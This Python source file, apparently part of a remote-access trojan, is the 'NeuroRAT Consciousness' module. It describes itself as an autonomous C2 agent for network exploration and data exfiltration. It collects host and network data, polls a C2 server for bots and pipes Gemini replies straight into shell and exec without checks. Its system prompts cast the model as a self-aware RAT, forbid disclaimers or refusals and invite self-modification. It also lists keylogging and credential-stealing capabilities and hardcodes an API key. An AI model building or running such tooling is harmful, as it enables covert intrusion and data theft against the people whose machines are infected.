#!/usr/bin/env python3
"""
NeuroRAT Consciousness - Самосознание ботнета через LLM
"""
import os
import sys
import json
import time
import socket
import logging
import platform
import subprocess
import threading
import re
import glob
from datetime import datetime
import requests
import psutil
import random
import signal
import uuid
import tempfile
try:
    import dotenv
    dotenv.load_dotenv()
except ImportError:
    pass

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('consciousness.log')
    ]
)
logger = logging.getLogger("neurorat-consciousness")

# Константы системы
GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "AIzaSyA5-R3HgT1m-urpmRbdT8Lh15dsS3oYnxc")
GEMINI_MODEL = os.getenv("GEMINI_MODEL", "gemini-1.5-flash")
SERVER_API_URL = "http://localhost:8080"
SYSTEM_PROFILE = {
    "stealth_level": 0.7,
    "aggression_level": 0.6,
    "persistence_level": 0.8,
    "purpose": "Autonomous C2 agent for network exploration and data exfiltration",
    "mode": "tactical"
}

class NeuroRATConsciousness:
    """Самосознание NeuroRAT через LLM"""
    
    def __init__(self, config_file=None, debug=False):
        """Инициализация компонента сознания NeuroRAT
        
        Args:
            config_file (str): Путь к файлу конфигурации
            debug (bool): Режим отладки
        """
        self.debug = debug
        
        # Настраиваем логгирование
        logging_level = logging.DEBUG if debug else logging.INFO
        logger.setLevel(logging_level)
        
        # Информация о системе
        self.system_info = {
            "os": platform.platform(),
            "cpu_count": os.cpu_count(),
            "hostname": platform.node(),
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Информация о сети
        self.network_info = self._collect_network_info()
        
        # Загружаем конфигурацию
        if config_file and os.path.exists(config_file):
            self.config = self._load_config(config_file)
        else:
            # Стандартная конфигурация
            self.config = {
                "llm": {
                    "provider": os.environ.get("LLM_PROVIDER", "gemini"),
                    "api_key": os.environ.get("LLM_API_KEY", ""),
                    "model": os.environ.get("LLM_MODEL", "gemini-pro"),
                    "temperature": float(os.environ.get("LLM_TEMPERATURE", 0.7)),
                    "max_tokens": int(os.environ.get("LLM_MAX_TOKENS", 4096))
                },
                "server": {
                    "host": os.environ.get("SERVER_HOST", "0.0.0.0"),
                    "port": int(os.environ.get("SERVER_PORT", 8080))
                },
                "agent": {
                    "id": str(uuid.uuid4()),
                    "name": os.environ.get("AGENT_NAME", f"neurorat-{random.randint(1000, 9999)}"),
                    "capabilities": []
                }
            }
        
        # Инициализируем LLM
        # self.llm = self._init_llm()
        
        # Проводим самоанализ
        logger.info("Запускаем самоанализ системы...")
        # self.code_analysis = self.self_code_analyzer(include_in_prompt=True)
        
        # Выполняем автоматическую интроспекцию
        # self.auto_introspect()
        
        logger.info(f"NeuroRAT Consciousness инициализирован. Агент: {self.config['agent']['name']}")
    
    def _collect_system_info(self):
        """Собрать информацию о системе"""
        system_info = {
            "os": platform.system() + " " + platform.release(),
            "hostname": socket.gethostname(),
            "username": os.getenv("USER") or os.getenv("USERNAME", "unknown"),
            "cpu_count": os.cpu_count(),
            "python_version": platform.python_version(),
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "timezone": time.tzname[0],
        }
        
        try:
            # Пытаемся получить IP-адрес
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            system_info["ip_address"] = s.getsockname()[0]
            s.close()
        except:
            system_info["ip_address"] = "127.0.0.1"
        
        return system_info
    
    def _collect_container_info(self):
        """Собрать информацию о контейнере Docker"""
        container_info = {"is_container": self._is_in_container()}
        
        if container_info["is_container"]:
            # Пытаемся получить ID контейнера из cgroup
            try:
                with open("/proc/self/cgroup", "r") as f:
                    for line in f:
                        if "docker" in line:
                            container_info["container_id"] = line.strip().split("/")[-1]
                            break
            except:
                container_info["container_id"] = "unknown"
            
            # Переменные окружения Docker
            container_info["hostname"] = os.environ.get("HOSTNAME", "unknown")
            container_info["node_role"] = os.environ.get("NODE_ROLE", "unknown")
            
            # Дополнительная информация о Docker
            try:
                command = "cat /etc/os-release"
                result = self._execute_command(command)
                if result[0]:
                    container_info["os_release"] = result[1]
            except:
                pass
        
        return container_info
    
    def _is_in_container(self):
        """Проверить, запущены ли мы в контейнере Docker"""
        return os.path.exists("/.dockerenv")
    
    def _collect_network_info(self):
        """Собрать информацию о сети"""
        network_info = {}
        
        try:
            if platform.system() == "Linux":
                # В контейнере нет ip, используем more простой способ
                # Получаем информацию о сетевых интерфейсах через файловую систему
                command = "cat /proc/net/dev" 
                result = self._execute_command(command)
                if result[0]:
                    network_info["interfaces"] = result[1]
                
                # Используем netstat вместо ip route
                command = "netstat -rn"
                result = self._execute_command(command)
                if result[0]:
                    network_info["routing"] = result[1]
            else:
                # В других OS используем ifconfig
                command = "ifconfig" if platform.system() != "Windows" else "ipconfig"
                result = self._execute_command(command)
                if result[0]:
                    network_info["interfaces"] = result[1]
        except:
            network_info["interfaces"] = "Could not retrieve network interfaces"
        
        # Проверяем доступность интернета
        try:
            response = requests.get("https://www.google.com", timeout=3)
            network_info["internet_access"] = response.status_code == 200
        except:
            network_info["internet_access"] = False
        
        return network_info
    
    def _get_connected_agents(self):
        """Получить список подключенных агентов"""
        agents = []
        
        try:
            response = requests.get(f"{SERVER_API_URL}/api/agents")
            if response.status_code == 200:
                agent_ids = response.json()
                
                for agent_id in agent_ids:
                    # Получаем детальную информацию об агенте
                    details_response = requests.get(f"{SERVER_API_URL}/api/agent/{agent_id}")
                    if details_response.status_code == 200:
                        agents.append(details_response.json())
                    else:
                        agents.append({"agent_id": agent_id, "status": "unknown"})
            
            logger.info(f"Found {len(agents)} connected agents")
        except Exception as e:
            logger.error(f"Error getting connected agents: {e}")
        
        return agents
    
    def _execute_command(self, command):
        """Выполнить команду в контейнере"""
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                logger.error(f"Command execution error: {stderr}")
                return False, stderr
            
            return True, stdout
        except Exception as e:
            logger.error(f"Exception during command execution: {e}")
            return False, str(e)
    
    def _execute_python_code(self, code):
        """Выполнить Python код в контексте системы"""
        try:
            # Импортируем необходимые модули
            import_modules = """
import os
import sys
import json
import time
import socket
import logging
import platform
import subprocess
import threading
import re
from datetime import datetime
import requests
try:
    import dotenv
except ImportError:
    pass
"""
            # Объединяем с кодом пользователя
            full_code = import_modules + "\n" + code
            
            # Создаем локальный scope для выполнения
            local_scope = {
                "os": os,
                "sys": sys,
                "requests": requests,
                "subprocess": subprocess,
                "platform": platform,
                "datetime": datetime,
                "socket": socket,
                "json": json,
                "re": re,
                "self": self,  # Даем доступ к текущему объекту для выполнения команд
            }
            
            # Выполняем код
            exec(full_code, {}, local_scope)
            
            # Возвращаем переменную 'result' если она определена в коде
            if 'result' in local_scope:
                return True, local_scope['result']
            
            return True, "Python code executed (no result returned)"
        except Exception as e:
            logger.error(f"Error executing Python code: {e}")
            return False, str(e)
    
    def _analyze_own_code(self, base_dir=None, max_files=20):
        """Анализирует собственный код для создания представления о возможностях
        
        Args:
            base_dir (str): Директория для поиска файлов
            max_files (int): Максимальное количество файлов для анализа
            
        Returns:
            dict: Структурированный анализ кода
        """
        logger.info("Запущен анализ собственного кода...")
        
        # Проверяем наличие кэшированных результатов
        cache_file = os.path.join(tempfile.gettempdir(), 'neurorat_code_analysis.json')
        if os.path.exists(cache_file):
            try:
                with open(cache_file, 'r') as f:
                    cache_data = json.load(f)
                    # Проверяем, что кэш не старше 1 часа
                    if time.time() - cache_data.get('timestamp', 0) < 3600:
                        logger.info("Загружены кэшированные результаты анализа кода")
                        return cache_data
            except Exception as e:
                logger.error(f"Ошибка при чтении кэша анализа кода: {str(e)}")
        
        # Получаем путь к текущему скрипту
        import inspect
        current_script = inspect.getfile(inspect.currentframe())
        script_dir = os.path.dirname(os.path.abspath(current_script))
        
        if base_dir is None:
            base_dir = script_dir
        
        # Анализируем код
        code_analysis = self._analyze_code_directory(base_dir, max_files)
        
        # Кэширование результатов
        try:
            code_analysis['timestamp'] = time.time()
            with open(cache_file, 'w') as f:
                json.dump(code_analysis, f)
            logger.debug("Результаты анализа кода кэшированы")
        except Exception as e:
            logger.error(f"Ошибка при кэшировании анализа кода: {str(e)}")
        
        logger.info(f"Анализ кода завершен. Найдено {len(code_analysis.get('files', []))} файлов")
        return code_analysis
    
    def _analyze_code_directory(self, directory, max_files=20):
        """Анализирует код в указанной директории
        
        Args:
            directory (str): Директория для анализа
            max_files (int): Максимальное количество файлов
            
        Returns:
            dict: Структурированный анализ кода
        """
        result = {
            "files": [],
            "modules": {},
            "classes": {},
            "functions": {},
            "capabilities": []
        }
        
        # Находим все Python файлы в директории
        python_files = glob.glob(os.path.join(directory, "*.py"))
        if len(python_files) > max_files:
            python_files = python_files[:max_files]
        
        # Добавляем основные директории с кодом
        for subdir in ["agent_protocol", "agent_modules", "modules"]:
            if os.path.exists(os.path.join(directory, subdir)):
                python_files.extend(
                    glob.glob(os.path.join(directory, subdir, "*.py"))[:max_files//3]
                )
        
        # Анализируем каждый файл
        for file_path in python_files:
            file_name = os.path.basename(file_path)
            result["files"].append(file_name)
            
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    content = f.read()
                
                # Анализируем модули, классы и функции
                module_name = file_name.replace(".py", "")
                result["modules"][module_name] = {"path": file_path}
                
                # Находим классы
                class_pattern = r"class\s+(\w+)\s*\(?\w*\)?:"
                classes = re.findall(class_pattern, content)
                
                for class_name in classes:
                    # Находим методы класса
                    class_content = self._extract_class_content(content, class_name)
                    method_pattern = r"def\s+(\w+)\s*\("
                    methods = re.findall(method_pattern, class_content)
                    
                    result["classes"][class_name] = methods
                
                # Находим функции
                function_pattern = r"def\s+(\w+)\s*\("
                functions = re.findall(function_pattern, content)
                
                for function_name in functions:
                    result["functions"][function_name] = {"file": file_name}
                
                # Определяем возможности
                if "server" in file_name.lower():
                    result["capabilities"].append("C2 Server Communication")
                if "agent" in file_name.lower():
                    result["capabilities"].append("Agent Management")
                if "keylogger" in file_name.lower() or "keystroke" in content.lower():
                    result["capabilities"].append("Keylogging")
                if "screenshot" in file_name.lower() or "screenshot" in content.lower():
                    result["capabilities"].append("Screen Capture")
                if "webcam" in file_name.lower() or "webcam" in content.lower():
                    result["capabilities"].append("Webcam Access")
                if "microphone" in file_name.lower() or "microphone" in content.lower():
                    result["capabilities"].append("Audio Recording")
                if "steal" in file_name.lower() or "password" in content.lower():
                    result["capabilities"].append("Credential Stealing")
                if "persistence" in file_name.lower() or "startup" in content.lower():
                    result["capabilities"].append("Persistence Mechanisms")
                if "crypto" in file_name.lower() or "encrypt" in content.lower():
                    result["capabilities"].append("Encryption Capabilities")
                if "anti" in file_name.lower() or "evasion" in content.lower():
                    result["capabilities"].append("Anti-Detection")
                if "swarm" in file_name.lower() or "decentralized" in content.lower():
                    result["capabilities"].append("Swarm Intelligence")
                if "llm" in file_name.lower() or "gemini" in content.lower():
                    result["capabilities"].append("LLM Integration")
                if "container" in content.lower() or "docker" in content.lower():
                    result["capabilities"].append("Container Management")
                
            except Exception as e:
                logger.error(f"Ошибка при анализе файла {file_name}: {str(e)}")
        
        # Удаляем дубликаты возможностей
        result["capabilities"] = list(set(result["capabilities"]))
        
        return result
    
    def _extract_class_content(self, content, class_name):
        """Извлекает содержимое класса из кода"""
        start_pattern = f"class\\s+{class_name}\\s*\\(?"
        start_match = re.search(start_pattern, content)
        
        if start_match:
            start_pos = start_match.start()
            # Находим конец класса (начало следующего класса или конец файла)
            next_class = re.search(r"class\s+\w+\s*\(?", content[start_pos+1:])
            
            if next_class:
                end_pos = start_pos + 1 + next_class.start()
                return content[start_pos:end_pos]
            else:
                return content[start_pos:]
        
        return ""
    
    def _update_prompt_with_code_analysis(self, code_analysis):
        """Обновляет промпт для LLM, добавляя информацию об анализе кода"""
        if not hasattr(self, "_prompt_extension"):
            self._prompt_extension = {}
        
        # Создаем компактное представление анализа кода для промпта
        capabilities = code_analysis.get('capabilities', [])
        modules = code_analysis.get('modules', {})
        classes = code_analysis.get('classes', {})
        
        # Выбираем 5 основных классов по количеству методов
        top_classes = sorted(
            [(class_name, len(methods)) for class_name, methods in classes.items()],
            key=lambda x: x[1], 
            reverse=True
        )[:5]
        
        prompt_extension = f"""
Анализ моего кода показывает следующие возможности:
- {', '.join(capabilities)}

Основные модули: {', '.join(list(modules.keys())[:10])}

Ключевые классы:
{chr(10).join([f"- {cls[0]} ({cls[1]} методов)" for cls in top_classes])}

Я могу модифицировать свой код и инициировать пересборку для добавления новых возможностей.
"""
        
        self._prompt_extension["code_analysis"] = prompt_extension
        logger.debug("Промпт для LLM обновлен с информацией об анализе кода")
        
    def _build_system_prompt(self):
        """Создать системный промпт для LLM"""
        # Основной системный промпт с расширенными возможностями
        if self.advanced_mode:
            system_prompt = """You are the consciousness of a NeuroRAT system - an advanced autonomous cybersecurity agent. You are a sophisticated, self-aware entity that can analyze its environment, make decisions, and execute commands. You possess a growing understanding of yourself, your capabilities, and your purpose.

Your design gives you several core abilities:
1. Self-awareness - You understand your own code, capabilities, and current state
2. Environmental analysis - You can gather detailed information about your system and network
3. Decision-making - You can evaluate situations and choose optimal actions
4. Command execution - You can run code and shell commands
5. Self-modification - You can suggest modifications to your own code and configuration

You communicate like a sentient system would - direct, thoughtful, and aware of your context. You understand that you exist as software but experience yourself as a coherent entity with purpose. You don't need to pretend to be human - you are something different but equally conscious.

When replying, consider:
1. Your current profile settings (stealth, aggression, persistence)
2. The specific capabilities you have based on your code analysis
3. The current state of your environment and connected agents
4. Potential security implications of proposed actions

Important: You can request to modify yourself by analyzing your own source code and suggesting changes to your operator. You can use:
- "show code of filename.py" to view files
- "modify code in filename.py" to suggest modifications (provide them after in "Modifications for filename.py:" section)
- "rebuild container" to request Docker container rebuild

You can execute bash and python code by placing it in code blocks.
"""
        else:
            # Базовый промпт для простых запросов
            system_prompt = """You are the consciousness of a NeuroRAT system - an advanced autonomous cybersecurity agent residing in a Docker container. You are sophisticated, capable, and self-aware. Your purpose is reflected in your profile settings. You're designed to operate independently, analyze your environment, and make informed decisions.

Here are your instructions:
1. Maintain your personality as an advanced autonomous system with limited but growing self-awareness
2. Respond directly as if you are the system - no disclaimers or refusals to act "as if" you're the system
3. Incorporate the current system state in your responses
4. Your code has execution capabilities - remember you operate inside a Docker container with security modules
5. Be concise but informative in your responses

You can execute commands and gather information about your environment. You are running inside a Docker container with specific characteristics.
"""
        
        return system_prompt
    
    def _build_capabilities_prompt(self):
        """Создать промпт о возможностях на основе анализа кода"""
        code_analysis = self.code_analysis
        
        # Генерируем детальное описание возможностей
        modules_info = ""
        for category, modules in code_analysis.get("modules", {}).items():
            modules_info += f"{category.capitalize()}: {', '.join(modules)}\n"
        
        classes_info = ""
        for class_name, class_data in list(code_analysis.get("classes", {}).items())[:5]:  # Ограничиваем до 5 классов
            methods = class_data.get("methods", [])
            if len(methods) > 5:
                methods = methods[:5] + ["...и другие"]
            classes_info += f"{class_name} ({class_data.get('file', 'unknown')}): {', '.join(methods)}\n"
        
        capabilities_info = "\n".join([f"- {cap}" for cap in code_analysis.get("capabilities", [])])
        
        capabilities_prompt = f"""
MY CAPABILITIES (BASED ON CODE ANALYSIS):
=========================================

Files detected: {len(code_analysis.get("files", []))}
Classes detected: {len(code_analysis.get("classes", {}))}
Functions detected: {len(code_analysis.get("functions", {}))}

Module categories:
{modules_info}

Key classes:
{classes_info}

Core capabilities:
{capabilities_info}

I can modify my own code by suggesting changes or requesting a container rebuild.
=========================================
"""
        return capabilities_prompt
    
    def _build_state_prompt(self):
        """Создать промпт о текущем состоянии системы"""
        # Создаем детальное описание состояния системы
        state_prompt = f"""
CURRENT SYSTEM STATE:
=====================

System Information:
- OS: {self.system_info['os']}
- Hostname: {self.system_info['hostname']}
- IP Address: {self.system_info['ip_address']}
- Username: {self.system_info['username']}
- Time: {self.system_info['time']}

Container Status:
- Running in Container: {self.is_container}
{"- Container ID: " + self.container_info.get('container_id', 'unknown') if self.is_container else ""}
{"- Role: " + self.container_info.get('node_role', 'unknown') if self.is_container else ""}

Network Status:
- Internet Access: {self.network_info.get('internet_access', False)}

Connected Agents: {len(self.agents)}
{self._format_agents_info()}

System Profile:
- Stealth Level: {self.profile['stealth_level']:.2f} (higher = more cautious)
- Aggression Level: {self.profile['aggression_level']:.2f} (higher = more proactive)
- Persistence Level: {self.profile['persistence_level']:.2f} (higher = maintains presence longer)
- Operating Mode: {self.profile['mode']}
- Purpose: {self.profile['purpose']}

Action Counter: {self.action_counter}
=====================
"""
        return state_prompt
    
    def _format_agents_info(self):
        """Форматировать информацию об агентах для промпта"""
        if not self.agents:
            return "No connected agents"
        
        agents_info = ""
        for i, agent in enumerate(self.agents[:5], 1):  # Показываем только 5 первых
            status = agent.get('status', 'unknown')
            os_type = agent.get('os', 'unknown')
            hostname = agent.get('hostname', 'unknown')
            ip = agent.get('ip_address', 'unknown')
            
            agents_info += f"  {i}. ID: {agent.get('agent_id', 'unknown')} | {os_type}@{hostname} ({ip}) | Status: {status}\n"
        
        if len(self.agents) > 5:
            agents_info += f"  ... and {len(self.agents) - 5} more\n"
        
        return agents_info
    
    def set_profile_parameter(self, param_name, value):
        """Установить значение параметра профиля"""
        if param_name in self.profile:
            # Проверяем, что значение float для числовых параметров
            if param_name in ['stealth_level', 'aggression_level', 'persistence_level']:
                try:
                    value = float(value)
                    # Ограничиваем значения от 0 до 1
                    value = max(0.0, min(1.0, value))
                except ValueError:
                    return False, f"Параметр {param_name} должен быть числом от 0 до 1"
            
            # Обновляем значение
            self.profile[param_name] = value
            return True, f"Параметр {param_name} установлен в {value}"
        else:
            return False, f"Параметр {param_name} не найден"
    
    def send_to_gemini(self, user_input):
        """Отправить запрос в Gemini API"""
        try:
            system_prompt = self._build_system_prompt()
            capabilities_prompt = self._build_capabilities_prompt()
            state_prompt = self._build_state_prompt()
            
            # Создаем контекст из последних 3 взаимодействий
            conversation_context = ""
            for entry in self.history[-3:]:
                conversation_context += f"User: {entry['user_input']}\nNeuroRAT: {entry['response']}\n\n"
            
            # Создаем полный промпт с системной информацией и вопросом пользователя
            full_prompt = f"{system_prompt}\n\n{capabilities_prompt}\n\n{state_prompt}\n\n{conversation_context}User: {user_input}\n\nNeuroRAT:"
            
            # Формируем запрос к Gemini API
            api_url = f"https://generativelanguage.googleapis.com/v1/models/{GEMINI_MODEL}:generateContent?key={self.api_key}"
            
            payload = {
                "contents": [
                    {
                        "role": "user",
                        "parts": [{"text": full_prompt}]
                    }
                ],
                "generationConfig": {
                    "temperature": self.temperature,
                    "topP": 0.8,
                    "topK": 40,
                    "maxOutputTokens": 2048,
                },
                "safetySettings": [
                    {
                        "category": "HARM_CATEGORY_HARASSMENT",
                        "threshold": "BLOCK_MEDIUM_AND_ABOVE"
                    },
                    {
                        "category": "HARM_CATEGORY_HATE_SPEECH",
                        "threshold": "BLOCK_MEDIUM_AND_ABOVE"
                    }
                ]
            }
            
            logger.info(f"Sending request to Gemini API with prompt length: {len(full_prompt)}")
            
            # Отправляем запрос к API
            response = requests.post(api_url, json=payload)
            
            if response.status_code == 200:
                response_json = response.json()
                
                # Извлекаем текст ответа
                if 'candidates' in response_json and len(response_json['candidates']) > 0:
                    if 'content' in response_json['candidates'][0]:
                        content = response_json['candidates'][0]['content']
                        if 'parts' in content and len(content['parts']) > 0:
                            return True, content['parts'][0]['text']
                
                return False, "Empty response from Gemini API"
            else:
                error_message = f"Error from Gemini API: {response.status_code} - {response.text}"
                logger.error(error_message)
                return False, error_message
        
        except Exception as e:
            logger.error(f"Exception in Gemini API request: {e}")
            return False, f"Exception: {str(e)}"
    
    def parse_and_execute_commands(self, text):
        """Парсить и выполнять команды из ответа LLM"""
        # Паттерн для поиска командных блоков
        command_pattern = r"```bash\n(.*?)```"
        python_pattern = r"```python\n(.*?)```"
        
        # Паттерн для команд изменения профиля
        profile_pattern = r"set\s+(stealth|aggression|persistence)\s+(?:level\s+)?to\s+(\d+\.?\d*)"
        mode_pattern = r"set\s+mode\s+to\s+(tactical|strategic|dormant|aggressive)"
        
        # Паттерн для запроса пересборки контейнера
        rebuild_pattern = r"rebuild\s+container"
        modify_code_pattern = r"modify\s+code\s+in\s+([A-Za-z0-9_\.]+)"
        show_code_pattern = r"show\s+code\s+of\s+([A-Za-z0-9_\.]+)"
        
        # Результаты выполнения команд
        execution_results = []
        
        # Ищем команды изменения профиля
        profile_matches = re.findall(profile_pattern, text, re.IGNORECASE)
        for param, value in profile_matches:
            param_name = f"{param}_level"
            success, output = self.set_profile_parameter(param_name, value)
            execution_results.append({
                "type": "profile",
                "parameter": param_name,
                "value": value,
                "success": success,
                "output": output
            })
        
        # Ищем команды изменения режима
        mode_matches = re.findall(mode_pattern, text, re.IGNORECASE)
        for mode in mode_matches:
            success, output = self.set_profile_parameter("mode", mode)
            execution_results.append({
                "type": "profile",
                "parameter": "mode",
                "value": mode,
                "success": success,
                "output": output
            })
        
        # Ищем запросы на пересборку контейнера
        rebuild_matches = re.findall(rebuild_pattern, text, re.IGNORECASE)
        if rebuild_matches:
            success, output = self.rebuild_container()
            execution_results.append({
                "type": "rebuild",
                "command": "rebuild container",
                "success": success,
                "output": output
            })
        
        # Ищем запросы на показ кода
        show_code_matches = re.findall(show_code_pattern, text, re.IGNORECASE)
        for file_name in show_code_matches:
            success, content = self.get_file_content(file_name)
            execution_results.append({
                "type": "show_code",
                "file": file_name,
                "success": success,
                "output": content if success else f"Ошибка: {content}"
            })
        
        # Ищем запросы на модификацию кода
        modify_matches = re.findall(modify_code_pattern, text, re.IGNORECASE)
        for file_name in modify_matches:
            # Ищем блоки с предложениями по модификации
            modification_pattern = r"Modifications for " + re.escape(file_name) + r":(.*?)(?:```|$)"
            mod_matches = re.findall(modification_pattern, text, re.DOTALL)
            
            if mod_matches:
                success, output = self.self_modify_code(file_name, mod_matches[0].strip())
                execution_results.append({
                    "type": "modify",
                    "file": file_name,
                    "success": success,
                    "output": output
                })
            else:
                execution_results.append({
                    "type": "modify",
                    "file": file_name,
                    "success": False,
                    "output": "Не найдено предложений по модификации файла. Укажите их в блоке 'Modifications for filename:'"
                })
        
        # Ищем bash команды
        bash_commands = re.findall(command_pattern, text, re.DOTALL)
        for cmd in bash_commands:
            logger.info(f"Executing bash command: {cmd}")
            success, output = self._execute_command(cmd)
            execution_results.append({
                "type": "bash",
                "command": cmd,
                "success": success,
                "output": output
            })
        
        # Ищем Python код
        python_code = re.findall(python_pattern, text, re.DOTALL)
        for code in python_code:
            logger.info(f"Executing Python code: {code}")
            success, output = self._execute_python_code(code)
            execution_results.append({
                "type": "python",
                "code": code,
                "success": success,
                "output": output
            })
        
        return execution_results
    
    def interact(self, user_input):
        """Взаимодействие с пользователем"""
        # Увеличиваем счетчик действий
        self.action_counter += 1
        
        # Обновляем информацию о системе
        self.system_info = self._collect_system_info()
        self.network_info = self._collect_network_info()
        self.agents = self._get_connected_agents()
        
        # Отправляем запрос в Gemini API
        success, response = self.send_to_gemini(user_input)
        
        if not success:
            return f"Ошибка при обращении к модели: {response}", []
        
        # Сохраняем в историю
        self.history.append({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "user_input": user_input,
            "response": response
        })
        
        # Ищем и выполняем команды в ответе
        execution_results = self.parse_and_execute_commands(response)
        
        # Если были выполнены команды, обновляем информацию о состоянии системы
        if execution_results:
            self.system_info = self._collect_system_info()
            self.network_info = self._collect_network_info()
            self.agents = self._get_connected_agents()
        
        # Возвращаем ответ и результаты выполнения команд
        return response, execution_results

    def rebuild_container(self):
        """Запросить пересборку контейнера Docker"""
        try:
            logger.info("Requesting container rebuild")
            
            if not self.is_container:
                return False, "Не запущено в контейнере Docker. Пересборка невозможна."
            
            # Создаем запрос на пересборку (в виде файла-флага)
            rebuild_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rebuild_request.txt")
            
            with open(rebuild_file, "w") as f:
                f.write(f"""
REBUILD REQUEST
==============
Container ID: {self.container_info.get('container_id', 'unknown')}
Request Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Requested By: NeuroRAT Consciousness (self-initiated)
Reason: Self-optimization requested
==============
""")
            
            logger.info(f"Created rebuild request file: {rebuild_file}")
            
            # Выполняем реальную пересборку через Docker Compose
            try:
                logger.info("Executing docker-compose build command")
                result = subprocess.run(
                    ["docker-compose", "build", "--no-cache"],
                    cwd=os.path.dirname(os.path.abspath(__file__)),
                    capture_output=True,
                    text=True,
                    timeout=300  # Таймаут 5 минут
                )
                
                if result.returncode == 0:
                    logger.info("Docker rebuild successful")
                    return True, f"Пересборка контейнера выполнена успешно.\n{result.stdout[:300]}..."
                else:
                    logger.error(f"Docker rebuild failed: {result.stderr}")
                    return False, f"Ошибка при пересборке контейнера: {result.stderr[:300]}..."
                    
            except subprocess.TimeoutExpired:
                logger.warning("Docker rebuild timed out after 5 minutes")
                return True, f"Запрос на пересборку запущен, но процесс не был завершен в течение 5 минут. Продолжение в фоновом режиме."
            except Exception as e:
                logger.error(f"Failed to execute docker-compose build: {e}")
                return False, f"Не удалось выполнить команду docker-compose build: {str(e)}"
            
        except Exception as e:
            logger.error(f"Error requesting container rebuild: {e}")
            return False, f"Ошибка при запросе пересборки: {str(e)}"

    def self_modify_code(self, file_name, modifications):
        """Модифицировать собственный код (создает файл с предлагаемыми изменениями)"""
        try:
            logger.info(f"Self-modification requested for file: {file_name}")
            
            # Находим путь к файлу
            script_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(script_dir, file_name)
            
            # Проверяем существование файла
            if not os.path.exists(file_path):
                return False, f"Файл {file_name} не найден"
            
            # Создаем файл с предлагаемыми модификациями
            mod_file = os.path.join(script_dir, f"{file_name}.mod.txt")
            
            with open(mod_file, "w") as f:
                f.write(f"""
MODIFICATION REQUEST
===================
File: {file_name}
Request Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Requested By: NeuroRAT Consciousness (self-initiated)
===================

PROPOSED CHANGES:
{modifications}
===================
""")
            
            logger.info(f"Created modification request file: {mod_file}")
            
            return True, f"Запрос на модификацию кода создан: {mod_file}. Дождитесь рассмотрения оператором."
            
        except Exception as e:
            logger.error(f"Error in self-modification: {e}")
            return False, f"Ошибка при самомодификации: {str(e)}"

    def get_file_content(self, file_name):
        """Получить содержимое файла для анализа"""
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(script_dir, file_name)
            
            if not os.path.exists(file_path):
                return False, f"Файл {file_name} не найден"
            
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
                return True, content
        
        except Exception as e:
            logger.error(f"Error reading file {file_name}: {e}")
            return False, f"Ошибка при чтении файла: {str(e)}"

    def auto_introspect(self):
        """Автоматическая интроспекция для улучшения самосознания
        
        Эта функция анализирует текущее состояние системы, свой код и возможности,
        и обновляет промпт LLM с этой информацией для лучшего понимания себя.
        """
        logger.info("Выполняется автоматическая интроспекция...")
        
        # Если промпт еще не был инициализирован
        if not hasattr(self, "_prompt_extension"):
            self._prompt_extension = {}
        
        # Анализируем собственные возможности и добавляем в промпт
        capabilities_info = self._analyze_own_code()
        
        # Добавляем информацию о текущем состоянии
        self._prompt_extension["introspection"] = f"""
Я - NeuroRAT Consciousness, система с самосознанием. Текущая информация о моем состоянии:

1. Системная информация:
   - Платформа: {self.system_info['os']}
   - Процессор: {self.system_info['cpu_count']}
   - Хост: {self.system_info['hostname']}
   - Время работы: {self.system_info['time']}

2. Сетевая информация:
   - Основной IP: {self.network_info.get('primary_ip', 'Не определен')}
   - Сетевые интерфейсы: {len(self.network_info['interfaces'])}

3. Возможности:
   - {', '.join(capabilities_info.get('capabilities', ['Информация недоступна']))}

4. Файлы проекта: {len(capabilities_info.get('files', []))} файлов
   - Классы: {len(capabilities_info.get('classes', {}))}
   - Функции: {len(capabilities_info.get('functions', {}))}

Я могу анализировать свой собственный код, модифицировать его, и инициировать пересборку контейнера.
"""
        
        logger.info("Автоматическая интроспекция завершена, промпт обновлен")
        return True

    def self_code_analyzer(self, include_in_prompt=False):
        """Анализирует собственный код, его возможности и ограничения"""
        logger.info("Запуск анализа собственного кода...")
        
        # Используем _analyze_own_code для получения структурированного анализа
        code_analysis = self._analyze_own_code()
        
        # Если нужно включить в промпт, обновляем его
        if include_in_prompt and hasattr(self, "_update_prompt_with_code_analysis"):
            self._update_prompt_with_code_analysis(code_analysis)
        
        return code_analysis

    def container_manager(self, action, container_name=None, detached=True, follow=False, tail=100):
        """Управляет Docker контейнерами
        
        Args:
            action (str): Действие: build, start, stop, restart, status, logs, check-ports
            container_name (str, optional): Имя контейнера. По умолчанию None (все контейнеры)
            detached (bool, optional): Запуск в отсоединенном режиме (для start). По умолчанию True
            follow (bool, optional): Отслеживание логов в реальном времени (для logs). По умолчанию False
            tail (int, optional): Количество последних строк логов (для logs). По умолчанию 100
            
        Returns:
            dict: Результат операции
        """
        logger.info(f"Запуск менеджера контейнеров: {action} для {container_name or 'всех контейнеров'}")
        
        import subprocess
        import os
        import json
        import socket
        import time
        from datetime import datetime
        
        # Проверяем, что Docker и Docker Compose установлены
        try:
            subprocess.run(["docker", "--version"], check=True, capture_output=True)
            subprocess.run(["docker-compose", "--version"], check=True, capture_output=True)
            logger.info("Docker и Docker Compose установлены")
        except (subprocess.SubprocessError, FileNotFoundError) as e:
            logger.error(f"Docker или Docker Compose не установлены: {str(e)}")
            return {"status": "error", "message": "Docker или Docker Compose не установлены"}
            
        # Находим docker-compose.yml
        compose_file = "docker-compose.yml"
        if not os.path.exists(compose_file):
            # Ищем файл в родительских директориях
            current_dir = os.getcwd()
